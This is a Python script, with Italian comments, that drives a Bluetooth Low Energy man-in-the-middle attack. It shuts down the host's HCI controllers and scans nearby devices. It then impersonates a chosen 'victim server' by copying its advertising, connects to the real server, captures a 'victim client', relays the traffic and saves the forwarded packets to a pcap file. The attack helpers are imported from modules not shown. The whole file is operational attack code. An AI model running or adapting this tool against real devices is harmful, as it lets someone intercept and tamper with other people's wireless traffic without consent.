from scapy.layers.bluetooth import *
from os import system
from time import sleep
from utility import *
from scan import *
from attacks import *

SCANNING_DURATION = 3
CLIENT_CONNECTION_TIMEOUT = 15

if __name__ == '__main__':

    #spegnimento dei controller in modo da togliere il controllo al sistema operativo
    system('hciconfig hci0 down; hciconfig hci1 down')

    #apertura socket di comuncazione ESCLUSIVA con i due controller BLE
    try:
        server = BluetoothUserSocket(1)
        print('[OK] Server socket created')
        client = BluetoothUserSocket(0)
        print('[OK] Client socket created')
    except Exception as e:
        print(e)
        exit()
    
    #fase di scanning
    try:
        print('Starting scanning process')
        start_scanning(client)
        sleep(SCANNING_DURATION)
        stop_scanning(client)
        print('[OK] Starting scanning completed')
    except Exception as e:
        print(e)
        exit()
    
    #selezione dispositivo di cui emulare l'advertising
    scanned_devices = collect_scanning_result(client)
    show_scanning_result(scanned_devices)
    selected_device_idx = input("Select device to emulate: ")
    scanned_devices_list = list(scanned_devices.items())
    victim_server = scanned_devices_list[int(selected_device_idx)]

    # una volta aperte le due socket e trovato il server vittima si utilizza l'oggetto "attack" per gestire
    # tutte le fasi dell'attacco
    attack = MITM(client, server, victim_server[0])

    #connessione del client malevolo al server legittimo e inizio advertising del server malevolo
    try:
        attack.enable_emulation(victim_server[1])
        print(f'[OK] Client socket started to emulate victim server ({attack.server_paddr})')
        attack.victim_server_connect()
        print(f'[OK] Server socket connected to victim server ({attack.server_paddr})')
        print(f'[OK] Server handle found: {attack.server_handle}')
    except Exception as e:
        print(e)
        exit()

    #attesa del client vittima
    print('Starting the attack, now waiting for victim client...')
    if attack.capture_client(CLIENT_CONNECTION_TIMEOUT):
        print(f'[OK] Victim client connected:\n - Handle: {attack.client_handle}\n - Address: {attack.client_paddr}')
    else:
        print("Timeout elapsed, no victim client found")
        exit()
    
    #inizio dell'attacco una volta trovato il client vittima
    attack.run(CLIENT_CONNECTION_TIMEOUT)

    attack.save_forwarded_pkts("./sent_pkts_led.pcap")
    
    
    